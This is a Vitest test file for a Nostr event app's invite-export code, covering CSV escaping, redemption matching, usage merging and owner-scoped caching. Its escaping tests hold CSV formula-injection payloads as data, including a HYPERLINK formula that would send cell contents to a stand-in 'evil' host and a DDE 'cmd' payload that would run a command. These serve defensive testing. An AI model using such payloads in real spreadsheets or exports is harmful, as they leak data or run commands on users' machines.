/**
 * Invite export tests. The three things that would actually hurt if wrong:
 * CSV injection (the export lands in the same spreadsheet as the buyers' email
 * addresses), the label↔redemption matching (a wrong answer here re-mails people
 * who already joined), and the monotonic union (a used code must never flip back
 * to unused when its join request ages off the relays).
 */
import { describe, it, expect, beforeEach } from "vitest";
import { generateSecretKey, getPublicKey } from "nostr-tools/pure";
import { nsecEncode } from "nostr-tools/nip19";
import { inviteHash, makeInviteProof } from "@nostrautica/protocol";
import {
  __setPersistBackend,
  __resetPersistForTests,
  setActiveCacheOwner,
  type CacheEntry,
  type PersistBackend,
} from "$lib/cache/persist.js";
import {
  csvCell,
  csvDocument,
  codesCsv,
  codesTxt,
  observeUsed,
  mergeUsage,
  mergeIssued,
  buildUsageRows,
  filterUsageRows,
  usedCount,
  usageCsv,
  cachedInviteReport,
  saveInviteReport,
  exportFilename,
  type InviteUsage,
  type PublishedInvite,
} from "./invite-export.js";
import type { GeneratedInvite } from "./organizer.js";

const COORD = "31600:" + "a".repeat(64) + ":ev1";

/** A code the organizer generated, plus everything needed to redeem it. */
function makeCode(label: string) {
  const sk = generateSecretKey();
  const pubkey = getPublicKey(sk);
  const nsec = nsecEncode(sk);
  const invite: GeneratedInvite = {
    label,
    nsec,
    link: `https://app.example/#/e/naddr1/join?code=${nsec}`,
  };
  return { sk, pubkey, h: inviteHash(pubkey), invite };
}

/** A join request that redeems `code` on behalf of `attendee`. */
function redeem(
  code: ReturnType<typeof makeCode>,
  attendee: string,
  at: number,
  name?: string,
) {
  return {
    attendeePubkey: attendee,
    invite: makeInviteProof(code.sk, COORD, attendee),
    rumorCreatedAt: at,
    ...(name ? { name } : {}),
  };
}

describe("csvCell", () => {
  it("passes plain values through untouched", () => {
    expect(csvCell("invite-1")).toBe("invite-1");
    expect(csvCell(42)).toBe("42");
  });

  it("renders null/undefined as an empty field", () => {
    expect(csvCell(undefined)).toBe("");
    expect(csvCell(null)).toBe("");
  });

  it.each(["=1+1", "+1", "-1", "@SUM(A1)", "\t=1+1", "\r=1+1"])(
    "neutralises the formula lead-in %j",
    (evil) => {
      const cell = csvCell(evil);
      // Whatever the quoting, the value the importer sees must not START with a
      // character that makes it a formula.
      const unquoted = cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell;
      expect(unquoted.startsWith("'")).toBe(true);
      expect(/^[=+\-@\t\r]/.test(unquoted)).toBe(false);
    },
  );

  it("neutralises a hostile display name without losing its text", () => {
    const cell = csvCell('=HYPERLINK("http://evil/?"&A1,"click")');
    expect(cell.startsWith("'=")).toBe(false); // it contains a quote → gets wrapped
    expect(cell).toBe('"\'=HYPERLINK(""http://evil/?""&A1,""click"")"');
  });

  it("quotes and doubles embedded quotes, commas and newlines", () => {
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell("Doe, Jane")).toBe('"Doe, Jane"');
    expect(csvCell("two\nlines")).toBe('"two\nlines"');
    expect(csvCell("cr\rlf")).toBe('"cr\rlf"');
  });

  it("keeps a comma-bearing hostile value both quoted and neutralised", () => {
    expect(csvCell("=1,2")).toBe("\"'=1,2\"");
  });
});

describe("csvDocument", () => {
  it("writes CRLF-terminated RFC 4180 records", () => {
    expect(csvDocument([["a", "b"], ["c", "d"]])).toBe("a,b\r\nc,d\r\n");
  });
});

describe("codes export (Export A)", () => {
  const invites = [makeCode("invite-1").invite, makeCode("invite-2").invite];

  it("CSV carries the label — the join key the .txt form drops", () => {
    const csv = codesCsv(invites);
    const [header, ...rows] = csv.trimEnd().split("\r\n");
    expect(header).toBe("label,code,link");
    expect(rows).toHaveLength(2);
    expect(rows[0].startsWith("invite-1,")).toBe(true);
    expect(rows[0]).toContain(invites[0].nsec);
    expect(rows[0]).toContain(invites[0].link);
  });

  it(".txt is still links only, one per line", () => {
    expect(codesTxt(invites)).toBe(`${invites[0].link}\n${invites[1].link}`);
  });
});

describe("observeUsed", () => {
  const alice = "1".repeat(64);
  const bob = "2".repeat(64);

  it("matches a redemption back to its published hash via inviteHash", () => {
    const code = makeCode("invite-1");
    const used = observeUsed([redeem(code, alice, 1000)], new Set([code.h]), COORD);
    expect(Object.keys(used)).toEqual([code.h]);
    expect(used[code.h]).toMatchObject({ at: 1000, pubkey: alice });
  });

  it("ignores requests with no invite proof at all", () => {
    const code = makeCode("invite-1");
    const used = observeUsed(
      [{ attendeePubkey: alice, rumorCreatedAt: 1000 }],
      new Set([code.h]),
      COORD,
    );
    expect(used).toEqual({});
  });

  it("ignores a proof whose hash was never published", () => {
    const code = makeCode("invite-1");
    const other = makeCode("invite-2");
    const used = observeUsed([redeem(code, alice, 1000)], new Set([other.h]), COORD);
    expect(used).toEqual({});
  });

  it("rejects a proof replayed by someone else — used_by must name the holder", () => {
    // The invite pubkey is public once the first join request lands, so Bob can
    // echo it; the signature binds (coordinate, attendee), so his copy fails.
    const code = makeCode("invite-1");
    const stolen = {
      attendeePubkey: bob,
      invite: makeInviteProof(code.sk, COORD, alice), // signed for Alice
      rumorCreatedAt: 2000,
    };
    const used = observeUsed([stolen], new Set([code.h]), COORD);
    expect(used).toEqual({});
  });

  it("rejects a proof signed for a different event", () => {
    const code = makeCode("invite-1");
    const req = {
      attendeePubkey: alice,
      invite: makeInviteProof(code.sk, "31600:" + "b".repeat(64) + ":other", alice),
      rumorCreatedAt: 1000,
    };
    expect(observeUsed([req], new Set([code.h]), COORD)).toEqual({});
  });

  it("keeps the EARLIEST valid redemption of a single-use code", () => {
    const code = makeCode("invite-1");
    const used = observeUsed(
      [redeem(code, bob, 3000), redeem(code, alice, 1000)],
      new Set([code.h]),
      COORD,
    );
    expect(used[code.h]).toMatchObject({ at: 1000, pubkey: alice });
  });

  it("carries the self-declared name through for the identity column", () => {
    const code = makeCode("invite-1");
    const used = observeUsed([redeem(code, alice, 1000, "Alice")], new Set([code.h]), COORD);
    expect(used[code.h].name).toBe("Alice");
  });
});

describe("mergeUsage (monotonic union)", () => {
  const rec = (at: number, pubkey: string, name?: string) => ({ at, pubkey, ...(name ? { name } : {}) });

  it("never loses a used label when the fresh scan no longer sees it", () => {
    const prev: InviteUsage = { h1: rec(1000, "aa"), h2: rec(1100, "bb") };
    const merged = mergeUsage(prev, {}); // the join requests aged off the relays
    expect(merged).toEqual(prev);
  });

  it("adds newly observed redemptions", () => {
    const merged = mergeUsage({ h1: rec(1000, "aa") }, { h2: rec(2000, "bb") });
    expect(Object.keys(merged).sort()).toEqual(["h1", "h2"]);
  });

  it("keeps the earlier timestamp for a code seen twice", () => {
    const merged = mergeUsage({ h1: rec(2000, "bb") }, { h1: rec(1000, "aa") });
    expect(merged.h1).toMatchObject({ at: 1000, pubkey: "aa" });
  });

  it("never blanks a name we already recorded", () => {
    const merged = mergeUsage({ h1: rec(1000, "aa", "Alice") }, { h1: rec(1000, "aa") });
    expect(merged.h1.name).toBe("Alice");
  });

  it("fills in a name the earlier record lacked", () => {
    const merged = mergeUsage({ h1: rec(1000, "aa") }, { h1: rec(1000, "aa", "Alice") });
    expect(merged.h1.name).toBe("Alice");
  });

  it("treats an absent prev as an empty set", () => {
    expect(mergeUsage(undefined, { h1: rec(1, "aa") })).toEqual({ h1: rec(1, "aa") });
  });
});

describe("mergeIssued", () => {
  it("keeps labels a failed/partial fetch didn't return", () => {
    const prev: PublishedInvite[] = [{ h: "h1", label: "invite-1" }];
    expect(mergeIssued(prev, [])).toEqual(prev);
  });

  it("prefers the fresh list's order and dedupes by hash", () => {
    const merged = mergeIssued(
      [{ h: "h2", label: "old-2" }],
      [
        { h: "h1", label: "invite-1" },
        { h: "h2", label: "invite-2" },
      ],
    );
    expect(merged.map((i) => i.label)).toEqual(["invite-1", "invite-2"]);
  });
});

describe("buildUsageRows", () => {
  const issued: PublishedInvite[] = [
    { h: "h1", label: "invite-1" },
    { h: "h2", label: "invite-2" },
    { h: "h3", label: "invite-3" },
  ];
  const alice = "1".repeat(64);
  const used: InviteUsage = { h2: { at: 1700000000, pubkey: alice, name: "Alice" } };

  it("marks exactly the redeemed labels used, in issue order", () => {
    const rows = buildUsageRows(issued, used);
    expect(rows.map((r) => [r.label, r.used])).toEqual([
      ["invite-1", false],
      ["invite-2", true],
      ["invite-3", false],
    ]);
  });

  it("leaves the identity columns undefined on unused rows", () => {
    const rows = buildUsageRows(issued, used);
    expect(rows[0].npub).toBeUndefined();
    expect(rows[0].displayName).toBeUndefined();
    expect(rows[0].usedAt).toBeUndefined();
  });

  it("resolves the redeemer to an npub", () => {
    const row = buildUsageRows(issued, used)[1];
    expect(row.npub?.startsWith("npub1")).toBe(true);
    expect(row.usedAt).toBe(1700000000);
  });

  it("prefers a live name lookup but falls back to the recorded one", () => {
    expect(buildUsageRows(issued, used, () => "Alice Live")[1].displayName).toBe("Alice Live");
    expect(buildUsageRows(issued, used, () => undefined)[1].displayName).toBe("Alice");
    expect(buildUsageRows(issued, used, () => "   ")[1].displayName).toBe("Alice");
  });

  it("falls back to a short hash when the published entry has no label", () => {
    const rows = buildUsageRows([{ h: "abcdef0123456789" }], {});
    expect(rows[0].label).toBe("abcdef012345");
  });

  it("counts the used rows", () => {
    expect(usedCount(buildUsageRows(issued, used))).toBe(1);
  });

  it("scopes to unused only for the chase list", () => {
    const rows = buildUsageRows(issued, used);
    expect(filterUsageRows(rows, "unused").map((r) => r.label)).toEqual([
      "invite-1",
      "invite-3",
    ]);
    expect(filterUsageRows(rows, "all")).toHaveLength(3);
  });
});

describe("usageCsv", () => {
  it("writes the agreed columns with blank identity cells for unused rows", () => {
    const csv = usageCsv([
      { label: "invite-1", used: false },
      {
        label: "invite-2",
        used: true,
        usedAt: 1700000000,
        npub: "npub1xyz",
        displayName: "Alice",
      },
    ]);
    const lines = csv.trimEnd().split("\r\n");
    expect(lines[0]).toBe("label,used,used_at,npub,display_name");
    expect(lines[1]).toBe("invite-1,no,,,");
    expect(lines[2]).toBe("invite-2,yes,2023-11-14T22:13:20.000Z,npub1xyz,Alice");
  });

  it("neutralises a hostile display name in the report", () => {
    const csv = usageCsv([
      { label: "invite-1", used: true, usedAt: 1, npub: "npub1", displayName: "=cmd|'/c calc'!A1" },
    ]);
    expect(csv).toContain("'=cmd");
    expect(csv).not.toMatch(/,=cmd/);
  });
});

describe("saveInviteReport / cachedInviteReport", () => {
  function memBackend() {
    const store = new Map<string, CacheEntry>();
    const backend: PersistBackend = {
      async getAll() {
        return [...store.entries()];
      },
      async put(k, v) {
        store.set(k, v);
      },
      async delete(keys) {
        for (const k of keys) store.delete(k);
      },
    };
    return backend;
  }

  beforeEach(() => {
    __resetPersistForTests();
    __setPersistBackend(memBackend());
    setActiveCacheOwner("owner-pubkey");
  });

  it("round-trips the report through the owner-scoped cache", () => {
    saveInviteReport(COORD, [{ h: "h1", label: "invite-1" }], { h1: { at: 5, pubkey: "aa" } });
    expect(cachedInviteReport(COORD)).toEqual({
      issued: [{ h: "h1", label: "invite-1" }],
      used: { h1: { at: 5, pubkey: "aa" } },
    });
  });

  it("unions on write, so a caller cannot shrink the used-set", () => {
    saveInviteReport(
      COORD,
      [
        { h: "h1", label: "invite-1" },
        { h: "h2", label: "invite-2" },
      ],
      { h1: { at: 5, pubkey: "aa" } },
    );
    // A later pass whose relay scan saw nothing at all.
    const merged = saveInviteReport(COORD, [], {});
    expect(merged.used).toEqual({ h1: { at: 5, pubkey: "aa" } });
    expect(merged.issued.map((i) => i.label)).toEqual(["invite-1", "invite-2"]);
    expect(cachedInviteReport(COORD)?.used.h1.at).toBe(5);
  });

  it("nothing is stored for an unused code — absence is not persisted", () => {
    saveInviteReport(COORD, [{ h: "h1", label: "invite-1" }], {});
    expect(cachedInviteReport(COORD)?.used).toEqual({});
  });

  it("misses when there is no logged-in identity (owner-scoped)", () => {
    saveInviteReport(COORD, [{ h: "h1" }], {});
    setActiveCacheOwner(null);
    expect(cachedInviteReport(COORD)).toBeUndefined();
  });
});

describe("exportFilename", () => {
  it("is filesystem-safe and event-scoped", () => {
    expect(exportFilename("codes", "naddr1qq...xyz", "csv")).toBe(
      "nostrautica-codes-naddr1qqxyz.csv",
    );
    expect(exportFilename("used", "", "csv")).toBe("nostrautica-used-event.csv");
  });
});
